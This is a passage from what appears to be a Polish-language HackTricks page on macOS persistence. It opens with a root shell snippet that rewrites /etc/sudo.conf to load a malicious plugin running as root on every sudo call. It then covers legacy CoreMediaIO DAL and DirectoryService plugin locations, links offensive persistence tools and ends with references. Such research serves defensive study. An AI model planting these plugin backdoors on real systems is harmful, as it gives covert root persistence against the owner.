# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### Wtyczki CoreMediaIO DAL

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimalny przykład: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Starszy mechanizm:** Przestarzały od macOS 12.3. macOS 14.1 i nowsze domyślnie wyłączają starsze wtyczki wideo. Użytkownik musi przywrócić obsługę starszych wtyczek wideo z poziomu Recovery, zanim ta metoda zadziała; sam zapisywalny katalog nie wystarczy. [Aktualne wskazówki Apple dotyczące obsługi](https://support.apple.com/en-us/108387).
- Do zapisu w katalogu wtyczek wymagane są uprawnienia roota. Wykonanie kodu zależy od zgodnego klienta, który nadal ładuje wtyczki DAL; nie testowano tego w czasie działania na macOS 26.

#### Lokalizacja

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Wymagane uprawnienia roota
  - **Wyzwalacz:** Zgodny klient kamery wykrywa urządzenia **po przywróceniu obsługi starszych wtyczek**. Weryfikacja biblioteki przez klienta może zablokować wtyczkę innej firmy.

#### Opis i wykorzystanie

Wtyczki **DAL** (Device Abstraction Layer) CoreMediaIO były ładowane w procesie przez niektóre aplikacje do obsługi kamer. W prezentacji Apple dotyczącej [rozszerzeń kamery](https://developer.apple.com/videos/play/wwdc2022/10022/) wyraźnie stwierdzono, że starsze wtyczki DAL **nie** działały z FaceTime, QuickTime Player ani Photo Booth, a wiele innych klientów wymusza weryfikację biblioteki. Nowoczesne [rozszerzenia Core Media I/O](https://developer.apple.com/documentation/coremediaio) działają poza procesem, z osobnym modelem instalacji i zatwierdzania. Historyczna technika wykorzystująca działanie w procesie nie oznacza ogólnego obejścia Camera TCC w obecnych wersjach macOS.<sup>[[53]](#references)[[54]](#references)</sup>

Obserwacja bez modyfikacji w macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` istnieje i należy do roota. Nie zweryfikowano ani obsługi starszych wtyczek, ani ładowania ich przez jakiegokolwiek klienta.

### Wtyczki Directory Service

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Starszy, warunkowy mechanizm:** Instalacja wymaga uprawnień roota, a wtyczka musi być faktycznie skonfigurowana i załadowana. API wtyczek DirectoryService jest przestarzałe; przed uznaniem tego za wyzwalacz przy uruchomieniu sprawdź konfigurację Open Directory na docelowym Macu.

#### Lokalizacja

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Wymagane uprawnienia roota
  - **Wyzwalacz:** `dspluginhelperd` ładuje kwalifikującą się, skonfigurowaną wtyczkę, gdy jest ona potrzebna Open Directory. [Przewodnik Apple dotyczący środowiska uruchomieniowego wtyczek](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) informuje, że wtyczki nieskonfigurowane do uruchamiania mogą być ładowane leniwie przy otwarciu ich węzła.

#### Opis i wykorzystanie

`dspluginhelperd` obsługuje starsze pakiety wtyczek DirectoryService. Złośliwa wtyczka może umożliwić wykonanie kodu z podwyższonymi uprawnieniami, jeśli starsza wtyczka zostanie zaakceptowana i aktywowana; jest to odrębne od PAM i wtyczek Authorization. Sama obecność katalogu nie dowodzi, że nowo zapisana wtyczka uruchomi się przy następnym starcie. Lokalne podręczniki Apple `dspluginhelperd(8)` i `opendirectoryd(8)` w macOS 26.5 nadal wymieniają ten program pomocniczy i tę starszą ścieżkę.<sup>[[53]](#references)</sup>

Obserwacja bez modyfikacji w macOS 26: `/Library/DirectoryServices/PlugIns` i `/usr/libexec/dspluginhelperd` istnieją. Podczas testu nie zainstalowano, nie skonfigurowano ani nie załadowano żadnej wtyczki.

## Techniki utrwalania dostępu i narzędzia

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025: rok infostealerów](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Poza dobrymi, starymi LaunchAgents — 1 — pliki startowe powłoki](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Poza dobrymi, starymi LaunchAgents — 18 — X11 i XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Poza dobrymi, starymi LaunchAgents — 21 — ponownie otwierane aplikacje](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Poza dobrymi, starymi LaunchAgents — 20 — preferencje Terminala](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Poza dobrymi, starymi LaunchAgents — 13 — wtyczki audio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Wtyczki Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Poza dobrymi, starymi LaunchAgents — 12 — wtyczki QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Poza dobrymi, starymi LaunchAgents — 22 — LoginHook i LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Poza dobrymi, starymi LaunchAgents — 4 — zadania cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Poza dobrymi, starymi LaunchAgents — 2 — uruchamianie iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Poza dobrymi, starymi LaunchAgents — 7 — wtyczki xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Poza dobrymi, starymi LaunchAgents — 8 — Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Poza dobrymi, starymi LaunchAgents — 6 — SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Poza dobrymi, starymi LaunchAgents — 3 — elementy logowania](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Poza dobrymi, starymi LaunchAgents — 14 — atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Poza dobrymi, starymi LaunchAgents — 24 — akcje folderów](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Akcje folderów jako metoda utrwalania dostępu w macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Poza dobrymi, starymi LaunchAgents — 27 — skróty Docka](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Poza dobrymi, starymi LaunchAgents — 17 — próbniki kolorów](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Poza dobrymi, starymi LaunchAgents — 26 — wtyczki Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analiza utrwalania dostępu przez „Mac File Opener” (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Poza dobrymi, starymi LaunchAgents — 16 — wygaszacz ekranu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Zachowaj dostęp: wygaszacze ekranu jako metoda utrwalania dostępu w macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Poza dobrymi, starymi LaunchAgents — 11 — importery Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Poza dobrymi, starymi LaunchAgents — 9 — panel preferencji](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Poza dobrymi, starymi LaunchAgents — 19 — skrypty okresowe](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Poza dobrymi, starymi LaunchAgents — 5 — moduły uwierzytelniania wymiennego (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Poza dobrymi, starymi LaunchAgents — 28 — wtyczki autoryzacji](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Trwała kradzież danych uwierzytelniających za pomocą wtyczek autoryzacji (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Poza dobrymi, starymi LaunchAgents — 30 — plik konfiguracyjny man — man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Poza dobrymi, starymi LaunchAgents — 25 — moduły Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Poza dobrymi, starymi LaunchAgents — 31 — framework audytu BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Poza dobrymi, starymi LaunchAgents — 23 — emond, demon monitorujący zdarzenia](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Poza dobrymi, starymi LaunchAgents — 29 — amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Poza dobrymi, starymi LaunchAgents — 15 — xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Poza dobrymi, starymi LaunchAgents — 10 — pliki skryptów aplikacji](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Poza dobrymi, starymi LaunchAgents — 32 — wtyczki kafelków Docka](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Poza dobrymi, starymi LaunchAgents — 33 — widżety](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Poza dobrymi, starymi LaunchAgents — 34 — zadania rozruchowe launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Poza dobrymi, starymi LaunchAgents — 35 — utrwalanie dostępu przez NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Wykorzystanie poczty e-mail do utrwalania dostępu w OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Podejrzana modyfikacja pliku plist reguł Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Złośliwe profile — jedno z najpoważniejszych zagrożeń dla komputerów Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Sztuka tworzenia złośliwego oprogramowania na Maca, t. 1 — rozdz. 0x2: utrwalanie dostępu (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analiza CVE-2024-44243, obejścia SIP w macOS za pomocą rozszerzeń jądra (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE i eksfiltracja tokenów API przez pliki projektu Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nowa podatność w GitHub Copilot i Cursor — backdoor w pliku reguł (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome — alternatywne metody instalacji (rozszerzenia zewnętrzne)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Usuwanie ExtensionInstallForcelist w Chrome na Macu (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Pisanie wtyczek Sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Zdalne wykorzystanie Maca za pośrednictwem niestandardowych schematów URL (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Dwie metody utrwalania dostępu w macOS wykorzystujące wtyczki (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Minimalny przykład CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: analiza podatności macOS TCC opartej na Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Dokumentacja modułu Python `site` ( .pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Od Spotlight do Apple Intelligence — wykorzystanie 0day do kradzieży danych zasilających AI w macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
